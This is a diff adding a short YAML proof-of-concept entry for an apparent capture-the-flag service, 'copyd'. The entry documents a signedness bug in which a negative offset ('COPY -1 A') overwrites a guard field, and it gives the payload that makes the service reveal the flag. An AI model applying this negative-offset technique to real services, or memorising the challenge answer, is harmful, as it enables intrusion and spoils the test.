@@ -1,0 +1,20 @@
+info:
+  name: copyd_signed_offset_bypass
+  cve: ''
+  summary: TCP buffer-write service accepts negative offsets via signedness bug, allowing
+    overwrite of guard field protecting flag
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: TCP buffer-write service accepts negative offsets via signedness bug,
+    allowing overwrite of guard field protecting flag
+  steps:
+  - 1. Connect TCP to target port 9014
+  - 2. Receive banner "200 copyd ready"
+  - 3. Send "COPY -1 A" — writes single byte into guard field before buffer
+  - 4. Send "REVEAL" — returns flag{...} once guard is modified
+  payload: COPY -1 A\nREVEAL\n
+  verification: TCP buffer-write service accepts negative offsets via signedness bug,
+    allowing overwrite of guard field protecting flag
